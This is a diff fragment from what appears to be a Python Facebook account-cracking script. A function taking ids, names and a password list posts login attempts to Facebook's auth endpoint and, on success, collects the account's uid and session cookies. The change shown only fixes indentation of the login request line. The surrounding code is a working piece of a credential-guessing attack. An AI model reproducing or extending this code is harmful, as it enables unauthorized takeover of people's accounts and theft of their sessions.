@@ -416,8 +416,7 @@ def newidx(ids,names,passlist):
             'meta_inf_fbmeta': '', 
             'currently_logged_in_userid': '0', 
             'fb_api_req_friendly_name': 'authenticate'}
-
-    po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
